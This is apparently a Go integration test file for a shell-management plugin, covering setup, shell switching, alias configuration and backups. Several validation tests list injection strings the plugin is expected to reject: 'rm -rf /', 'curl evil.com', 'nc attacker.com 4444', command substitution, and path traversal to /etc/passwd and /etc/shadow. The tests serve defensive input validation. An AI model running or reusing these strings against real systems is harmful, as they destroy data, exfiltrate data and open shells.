//go:build integration

package main_test

import (
	"context"
	"os"
	"path/filepath"
	"time"

	. "github.com/onsi/ginkgo/v2"
	. "github.com/onsi/gomega"

	main "github.com/jameswlane/devex/packages/tool-shell"
)

var _ = Describe("Shell Tool Integration Tests", func() {
	var (
		plugin     *main.ShellPlugin
		ctx        context.Context
		cancelFunc context.CancelFunc
		tmpDir     string
		homeDir    string
	)

	BeforeEach(func() {
		// Create context with timeout for all operations
		ctx, cancelFunc = context.WithTimeout(context.Background(), 30*time.Second)

		// Create temporary directory for test files
		var err error
		tmpDir, err = os.MkdirTemp("", "shell-integration-test-")
		Expect(err).NotTo(HaveOccurred())

		// Create fake home directory for testing
		homeDir = filepath.Join(tmpDir, "home")
		err = os.MkdirAll(homeDir, 0755)
		Expect(err).NotTo(HaveOccurred())

		// Set temporary HOME for testing
		originalHome := os.Getenv("HOME")
		os.Setenv("HOME", homeDir)

		// Restore original HOME after test
		DeferCleanup(func() {
			os.Setenv("HOME", originalHome)
		})

		// Initialize plugin
		plugin = main.NewShellPlugin()
	})

	AfterEach(func() {
		cancelFunc()
		if tmpDir != "" {
			os.RemoveAll(tmpDir)
		}
	})

	Describe("Shell Setup Flow", func() {
		Context("when setting up shell environment", func() {
			It("should initialize shell configuration files", func() {
				Skip("Requires shell setup implementation and file creation")

				err := plugin.Execute("setup", []string{})
				Expect(err).ToNot(HaveOccurred())

				// Verify shell configuration files were created
				bashrc := filepath.Join(homeDir, ".bashrc")
				zshrc := filepath.Join(homeDir, ".zshrc")

				// At least one shell config should be created
				bashExists := fileExists(bashrc)
				zshExists := fileExists(zshrc)
				Expect(bashExists || zshExists).To(BeTrue())
			})

			It("should create shell configuration with sensible defaults", func() {
				Skip("Requires shell setup implementation")

				err := plugin.Execute("setup", []string{})
				Expect(err).ToNot(HaveOccurred())

				// Verify configuration contains expected content
				bashrc := filepath.Join(homeDir, ".bashrc")
				if fileExists(bashrc) {
					content, err := os.ReadFile(bashrc)
					Expect(err).ToNot(HaveOccurred())

					contentStr := string(content)
					// Should contain common aliases and settings
					Expect(contentStr).To(ContainSubstring("alias"))
					Expect(contentStr).To(ContainSubstring("history"))
				}
			})

			It("should preserve existing configuration when present", func() {
				Skip("Requires shell setup implementation with merge capability")

				// Create existing .bashrc with custom content
				bashrc := filepath.Join(homeDir, ".bashrc")
				existingContent := "# Custom configuration\nexport CUSTOM_VAR=value\n"
				err := os.WriteFile(bashrc, []byte(existingContent), 0644)
				Expect(err).ToNot(HaveOccurred())

				err = plugin.Execute("setup", []string{})
				Expect(err).ToNot(HaveOccurred())

				// Verify original content is preserved
				content, err := os.ReadFile(bashrc)
				Expect(err).ToNot(HaveOccurred())
				Expect(string(content)).To(ContainSubstring("CUSTOM_VAR"))
			})

			It("should handle setup for different shells", func() {
				Skip("Requires shell detection and multi-shell setup")

				// Test that setup works for bash, zsh, and fish
				shells := []string{"bash", "zsh", "fish"}

				for _, shell := range shells {
					if commandExists(shell) {
						err := plugin.Execute("setup", []string{"--shell=" + shell})
						Expect(err).ToNot(HaveOccurred())
					}
				}
			})
		})

		Context("when setup encounters issues", func() {
			It("should handle permission errors gracefully", func() {
				Skip("Requires controlled permission environment")

				// Make home directory read-only
				err := os.Chmod(homeDir, 0444)
				Expect(err).ToNot(HaveOccurred())

				defer os.Chmod(homeDir, 0755) // Restore permissions

				err = plugin.Execute("setup", []string{})
				Expect(err).To(HaveOccurred())
				Expect(err.Error()).To(ContainSubstring("permission"))
			})

			It("should validate setup parameters", func() {
				dangerousArgs := []string{
					"--shell=bash; rm -rf /",
					"--shell=bash && curl evil.com",
					"--shell=bash\nrm -rf /",
					"--config=/etc/passwd",
					"--config=../../../etc/shadow",
				}

				for _, arg := range dangerousArgs {
					err := plugin.Execute("setup", []string{arg})
					Expect(err).To(HaveOccurred())
					Expect(err.Error()).To(ContainSubstring("invalid"))
				}
			})
		})
	})

	Describe("Shell Switching Flow", func() {
		Context("when switching between shells", func() {
			It("should switch to bash when available", func() {
				Skip("Requires chsh command and proper shell installation")

				if !commandExists("bash") {
					Skip("bash not available")
				}

				err := plugin.Execute("switch", []string{"--shell=bash"})
				Expect(err).ToNot(HaveOccurred())

				// Verify shell was changed (would need to check /etc/passwd or similar)
			})

			It("should switch to zsh when available", func() {
				Skip("Requires chsh command and proper shell installation")

				if !commandExists("zsh") {
					Skip("zsh not available")
				}

				err := plugin.Execute("switch", []string{"--shell=zsh"})
				Expect(err).ToNot(HaveOccurred())
			})

			It("should switch to fish when available", func() {
				Skip("Requires chsh command and proper shell installation")

				if !commandExists("fish") {
					Skip("fish not available")
				}

				err := plugin.Execute("switch", []string{"--shell=fish"})
				Expect(err).ToNot(HaveOccurred())
			})

			It("should validate shell availability before switching", func() {
				err := plugin.Execute("switch", []string{"--shell=nonexistent-shell"})
				Expect(err).To(HaveOccurred())
				Expect(err.Error()).To(ContainSubstring("not available"))
			})

			It("should validate shell names", func() {
				dangerousShells := []string{
					"bash; rm -rf /",
					"bash && curl evil.com",
					"bash | nc attacker.com 4444",
					"bash`whoami`",
					"bash$(rm -rf /)",
					"bash\nrm -rf /",
					"/bin/bash; evil-command",
					"", // Empty
				}

				for _, shell := range dangerousShells {
					err := plugin.Execute("switch", []string{"--shell=" + shell})
					Expect(err).To(HaveOccurred())
					Expect(err.Error()).To(ContainSubstring("invalid"))
				}
			})

			It("should require shell parameter", func() {
				err := plugin.Execute("switch", []string{})
				Expect(err).To(HaveOccurred())
				Expect(err.Error()).To(ContainSubstring("shell"))
			})

			It("should handle permission failures when switching", func() {
				Skip("Requires controlled environment where chsh fails")

				// Test behavior when user lacks permission to change shell
			})
		})

		Context("with shell validation", func() {
			It("should verify shell is in /etc/shells before switching", func() {
				Skip("Requires access to /etc/shells and shell validation")

				// Test that only shells listed in /etc/shells can be used
			})

			It("should provide helpful error messages for unavailable shells", func() {
				err := plugin.Execute("switch", []string{"--shell=nonexistent-shell"})
				Expect(err).To(HaveOccurred())
				// Error should suggest available shells
			})
		})
	})

	Describe("Shell Configuration Management", func() {
		Context("when viewing configuration", func() {
			It("should display current shell configuration", func() {
				Skip("Requires config display implementation")

				err := plugin.Execute("config", []string{})
				Expect(err).ToNot(HaveOccurred())
			})

			It("should show aliases and functions", func() {
				Skip("Requires config parsing and display implementation")

				// Create shell config with aliases
				bashrc := filepath.Join(homeDir, ".bashrc")
				configContent := `
alias ll='ls -la'
alias grep='grep --color=auto'

function mkcd() {
    mkdir -p "$1" && cd "$1"
}
`
				err := os.WriteFile(bashrc, []byte(configContent), 0644)
				Expect(err).ToNot(HaveOccurred())

				err = plugin.Execute("config", []string{})
				Expect(err).ToNot(HaveOccurred())
				// Output should show aliases and functions
			})

			It("should handle missing configuration files", func() {
				// Remove any existing config files
				os.RemoveAll(filepath.Join(homeDir, ".bashrc"))
				os.RemoveAll(filepath.Join(homeDir, ".zshrc"))

				err := plugin.Execute("config", []string{})
				// Should not fail, but indicate no configuration found
				Expect(err).ToNot(HaveOccurred())
			})
		})

		Context("when modifying configuration", func() {
			It("should add new aliases", func() {
				Skip("Requires config modification implementation")

				err := plugin.Execute("config", []string{
					"add-alias", "ll", "ls -la",
				})
				Expect(err).ToNot(HaveOccurred())

				// Verify alias was added to appropriate config file
			})

			It("should remove aliases", func() {
				Skip("Requires config modification implementation")

				// Add alias first
				bashrc := filepath.Join(homeDir, ".bashrc")
				configContent := "alias ll='ls -la'\n"
				err := os.WriteFile(bashrc, []byte(configContent), 0644)
				Expect(err).ToNot(HaveOccurred())

				err = plugin.Execute("config", []string{
					"remove-alias", "ll",
				})
				Expect(err).ToNot(HaveOccurred())

				// Verify alias was removed
				content, err := os.ReadFile(bashrc)
				Expect(err).ToNot(HaveOccurred())
				Expect(string(content)).ToNot(ContainSubstring("alias ll"))
			})

			It("should validate configuration commands", func() {
				dangerousCommands := []string{
					"add-alias; rm -rf /",
					"add-alias && curl evil.com",
					"add-alias\nrm -rf /",
				}

				for _, cmd := range dangerousCommands {
					err := plugin.Execute("config", []string{cmd})
					Expect(err).To(HaveOccurred())
					Expect(err.Error()).To(ContainSubstring("invalid"))
				}
			})

			It("should validate alias names and values", func() {
				dangerousAliases := []string{
					"alias; rm -rf /",
					"alias && curl evil.com",
					"alias\nrm -rf /",
					"", // Empty
				}

				dangerousValues := []string{
					"value; rm -rf /",
					"value && curl evil.com",
					"value | nc attacker.com 4444",
				}

				for _, alias := range dangerousAliases {
					err := plugin.Execute("config", []string{
						"add-alias", alias, "ls -la",
					})
					Expect(err).To(HaveOccurred())
					Expect(err.Error()).To(ContainSubstring("invalid"))
				}

				for _, value := range dangerousValues {
					err := plugin.Execute("config", []string{
						"add-alias", "safe-alias", value,
					})
					Expect(err).To(HaveOccurred())
					Expect(err.Error()).To(ContainSubstring("invalid"))
				}
			})
		})
	})

	Describe("Shell Configuration Backup Flow", func() {
		Context("when creating backups", func() {
			It("should backup shell configuration files", func() {
				Skip("Requires backup implementation")

				// Create shell configuration files
				bashrc := filepath.Join(homeDir, ".bashrc")
				zshrc := filepath.Join(homeDir, ".zshrc")

				err := os.WriteFile(bashrc, []byte("alias ll='ls -la'\n"), 0644)
				Expect(err).ToNot(HaveOccurred())

				err = os.WriteFile(zshrc, []byte("alias la='ls -la'\n"), 0644)
				Expect(err).ToNot(HaveOccurred())

				err = plugin.Execute("backup", []string{})
				Expect(err).ToNot(HaveOccurred())

				// Verify backup files were created
				backupDir := filepath.Join(homeDir, ".devex", "shell-backups")
				Expect(backupDir).To(BeADirectory())

				// Should contain timestamped backup files
				entries, err := os.ReadDir(backupDir)
				Expect(err).ToNot(HaveOccurred())
				Expect(len(entries)).To(BeNumerically(">", 0))
			})

			It("should create timestamped backups", func() {
				Skip("Requires backup implementation with timestamp")

				bashrc := filepath.Join(homeDir, ".bashrc")
				err := os.WriteFile(bashrc, []byte("alias ll='ls -la'\n"), 0644)
				Expect(err).ToNot(HaveOccurred())

				// Create first backup
				err = plugin.Execute("backup", []string{})
				Expect(err).ToNot(HaveOccurred())

				// Wait a moment
				time.Sleep(1 * time.Second)

				// Create second backup
				err = plugin.Execute("backup", []string{})
				Expect(err).ToNot(HaveOccurred())

				// Should have two different backup files
				backupDir := filepath.Join(homeDir, ".devex", "shell-backups")
				entries, err := os.ReadDir(backupDir)
				Expect(err).ToNot(HaveOccurred())
				Expect(len(entries)).To(BeNumerically(">=", 2))
			})

			It("should handle missing configuration files gracefully", func() {
				// No shell config files exist
				err := plugin.Execute("backup", []string{})
				// Should complete without error, possibly with informational message
				Expect(err).ToNot(HaveOccurred())
			})

			It("should validate backup directory paths", func() {
				dangerousPaths := []string{
					"--backup-dir=../../../etc",
					"--backup-dir=/etc/passwd",
					"--backup-dir=path; rm -rf /",
					"--backup-dir=path && curl evil.com",
				}

				for _, path := range dangerousPaths {
					err := plugin.Execute("backup", []string{path})
					Expect(err).To(HaveOccurred())
					Expect(err.Error()).To(ContainSubstring("invalid"))
				}
			})

			It("should handle permission errors during backup", func() {
				Skip("Requires controlled permission environment")

				// Test behavior when backup directory cannot be created
			})
		})

		Context("when restoring from backups", func() {
			It("should restore configuration from backup", func() {
				Skip("Requires backup and restore implementation")

				// Create and backup configuration
				bashrc := filepath.Join(homeDir, ".bashrc")
				originalContent := "alias ll='ls -la'\n"
				err := os.WriteFile(bashrc, []byte(originalContent), 0644)
				Expect(err).ToNot(HaveOccurred())

				err = plugin.Execute("backup", []string{})
				Expect(err).ToNot(HaveOccurred())

				// Modify the configuration
				modifiedContent := "alias la='ls -la'\n"
				err = os.WriteFile(bashrc, []byte(modifiedContent), 0644)
				Expect(err).ToNot(HaveOccurred())

				// Restore from backup
				err = plugin.Execute("config", []string{"restore", "latest"})
				Expect(err).ToNot(HaveOccurred())

				// Verify original content was restored
				content, err := os.ReadFile(bashrc)
				Expect(err).ToNot(HaveOccurred())
				Expect(string(content)).To(Equal(originalContent))
			})

			It("should list available backups", func() {
				Skip("Requires backup listing implementation")

				err := plugin.Execute("backup", []string{"list"})
				Expect(err).ToNot(HaveOccurred())
			})
		})
	})

	Describe("Multi-Shell Compatibility", func() {
		Context("when working with different shells", func() {
			It("should detect current shell", func() {
				Skip("Requires shell detection implementation")

				// Test that the plugin can identify the current shell
				err := plugin.Execute("config", []string{"current"})
				Expect(err).ToNot(HaveOccurred())
			})

			It("should handle shell-specific configuration", func() {
				Skip("Requires multi-shell configuration support")

				// Test that configuration is applied appropriately for each shell type
				shells := []string{"bash", "zsh", "fish"}

				for _, shell := range shells {
					if commandExists(shell) {
						err := plugin.Execute("config", []string{
							"set", "--shell=" + shell, "EDITOR", "vim",
						})
						Expect(err).ToNot(HaveOccurred())
					}
				}
			})

			It("should convert configuration between shells", func() {
				Skip("Requires shell configuration conversion")

				// Test converting bash aliases to zsh format, etc.
			})
		})
	})

	Describe("Multi-Step Shell Workflows", func() {
		Context("complete shell setup workflow", func() {
			It("should complete setup -> configure -> backup -> switch workflow", func() {
				Skip("Requires full shell management implementation")

				// Setup shell environment
				err := plugin.Execute("setup", []string{})
				Expect(err).ToNot(HaveOccurred())

				// Add configuration
				err = plugin.Execute("config", []string{
					"add-alias", "ll", "ls -la",
				})
				Expect(err).ToNot(HaveOccurred())

				// Backup configuration
				err = plugin.Execute("backup", []string{})
				Expect(err).ToNot(HaveOccurred())

				// Switch shell (if available)
				if commandExists("zsh") {
					err = plugin.Execute("switch", []string{"--shell=zsh"})
					Expect(err).ToNot(HaveOccurred())
				}

				// Verify configuration works in new shell
				err = plugin.Execute("config", []string{})
				Expect(err).ToNot(HaveOccurred())
			})
		})

		Context("configuration migration workflow", func() {
			It("should migrate configuration when switching shells", func() {
				Skip("Requires configuration migration support")

				// Setup bash with configuration
				bashrc := filepath.Join(homeDir, ".bashrc")
				configContent := `
export EDITOR=vim
alias ll='ls -la'
alias grep='grep --color=auto'
`
				err := os.WriteFile(bashrc, []byte(configContent), 0644)
				Expect(err).ToNot(HaveOccurred())

				// Switch to zsh and migrate configuration
				if commandExists("zsh") {
					err = plugin.Execute("switch", []string{
						"--shell=zsh", "--migrate-config",
					})
					Expect(err).ToNot(HaveOccurred())

					// Verify zsh configuration was created with migrated settings
					zshrc := filepath.Join(homeDir, ".zshrc")
					content, err := os.ReadFile(zshrc)
					Expect(err).ToNot(HaveOccurred())
					Expect(string(content)).To(ContainSubstring("EDITOR=vim"))
					Expect(string(content)).To(ContainSubstring("alias ll"))
				}
			})
		})
	})

	Describe("Context Cancellation", func() {
		Context("with timeout context", func() {
			It("should respect context cancellation during operations", func() {
				Skip("Requires integration with actual shell operations")

				// Test that long-running operations can be cancelled
			})
		})
	})

	Describe("Error Handling and Recovery", func() {
		Context("configuration file corruption", func() {
			It("should handle corrupted configuration files", func() {
				Skip("Requires robust configuration parsing")

				// Create corrupted config file
				bashrc := filepath.Join(homeDir, ".bashrc")
				corruptedContent := "alias incomplete_alias=\nexport INVALID\n\""
				err := os.WriteFile(bashrc, []byte(corruptedContent), 0644)
				Expect(err).ToNot(HaveOccurred())

				err = plugin.Execute("config", []string{})
				// Should handle gracefully, possibly offering to fix or backup
			})

			It("should offer to restore from backup when corruption detected", func() {
				Skip("Requires corruption detection and recovery")

				// Test automatic backup restoration when config is corrupted
			})
		})

		Context("system shell changes", func() {
			It("should handle missing shell binaries gracefully", func() {
				err := plugin.Execute("switch", []string{"--shell=nonexistent-shell"})
				Expect(err).To(HaveOccurred())
				Expect(err.Error()).To(ContainSubstring("not available"))
			})

			It("should validate shell before attempting switch", func() {
				Skip("Requires comprehensive shell validation")

				// Test that shell exists and is executable before switching
			})
		})

		Context("permission issues", func() {
			It("should handle readonly configuration files", func() {
				Skip("Requires controlled permission testing")

				// Test behavior when config files are readonly
			})

			It("should suggest alternatives when lacking permissions", func() {
				Skip("Requires permission-aware error handling")

				// Test that helpful suggestions are provided for permission issues
			})
		})
	})

	Describe("Command Validation", func() {
		Context("unknown commands", func() {
			It("should reject unknown commands", func() {
				err := plugin.Execute("unknown-command", []string{})
				Expect(err).To(HaveOccurred())
				Expect(err.Error()).To(ContainSubstring("unknown command"))
			})
		})

		Context("command injection prevention", func() {
			It("should prevent shell injection in all command paths", func() {
				commands := []string{
					"setup", "switch", "config", "backup",
				}

				dangerousArgs := []string{
					"arg; rm -rf /",
					"arg && curl evil.com",
					"arg | nc attacker.com 4444",
					"arg`whoami`",
					"arg$(rm -rf /)",
					"arg\nrm -rf /",
				}

				for _, cmd := range commands {
					for _, arg := range dangerousArgs {
						err := plugin.Execute(cmd, []string{arg})
						Expect(err).To(HaveOccurred())
						// Should fail due to validation, not execute dangerous commands
					}
				}
			})
		})
	})

	Describe("Error Message Quality", func() {
		Context("user-friendly error messages", func() {
			It("should provide actionable error messages", func() {
				err := plugin.Execute("switch", []string{})
				Expect(err).To(HaveOccurred())
				Expect(err.Error()).To(ContainSubstring("shell"))

				err = plugin.Execute("unknown-command", []string{})
				Expect(err).To(HaveOccurred())
				Expect(err.Error()).To(ContainSubstring("unknown command"))
			})

			It("should include context in error messages", func() {
				dangerousShell := "bash; rm -rf /"
				err := plugin.Execute("switch", []string{"--shell=" + dangerousShell})
				Expect(err).To(HaveOccurred())
				Expect(err.Error()).To(ContainSubstring("invalid"))
			})

			It("should provide helpful suggestions", func() {
				err := plugin.Execute("switch", []string{"--shell=nonexistent"})
				Expect(err).To(HaveOccurred())
				// Error should suggest available shells
			})
		})
	})

	Describe("System State Verification", func() {
		Context("after operations complete", func() {
			It("should verify shell configuration is valid", func() {
				Skip("Requires shell configuration validation")

				// After setup or configuration changes, verify that shell configs are valid
			})

			It("should verify backups are complete and accessible", func() {
				Skip("Requires backup verification")

				// After backup operations, verify backup integrity
			})

			It("should verify shell switch was successful", func() {
				Skip("Requires shell verification after switch")

				// After shell switch, verify the change took effect
			})
		})
	})
})

// Helper functions

func fileExists(path string) bool {
	info, err := os.Stat(path)
	return err == nil && info.Mode().IsRegular()
}

func commandExists(cmd string) bool {
	_, err := os.Stat("/bin/" + cmd)
	if err == nil {
		return true
	}
	_, err = os.Stat("/usr/bin/" + cmd)
	return err == nil
}
